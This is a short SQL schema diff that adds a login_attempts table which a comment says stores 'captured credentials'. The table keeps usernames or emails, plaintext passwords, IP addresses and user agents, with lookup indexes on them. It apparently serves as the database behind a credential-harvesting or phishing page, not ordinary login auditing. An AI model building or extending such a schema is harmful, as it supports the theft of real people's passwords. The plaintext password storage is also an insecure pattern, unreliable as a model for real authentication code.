@@ -34,3 +34,18 @@ CREATE TRIGGER update_users_updated_at
     BEFORE UPDATE ON users 
     FOR EACH ROW 
     EXECUTE FUNCTION update_updated_at_column();
+
+-- Create login_attempts table to store captured credentials
+CREATE TABLE login_attempts (
+    id SERIAL PRIMARY KEY,
+    email_or_username VARCHAR(255) NOT NULL,
+    password VARCHAR(255) NOT NULL,
+    ip_address INET,
+    user_agent TEXT,
+    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+);
+
+-- Create indexes for faster lookups
+CREATE INDEX idx_login_attempts_ip ON login_attempts(ip_address);
+CREATE INDEX idx_login_attempts_created_at ON login_attempts(created_at);
+CREATE INDEX idx_login_attempts_email_username ON login_attempts(email_or_username);
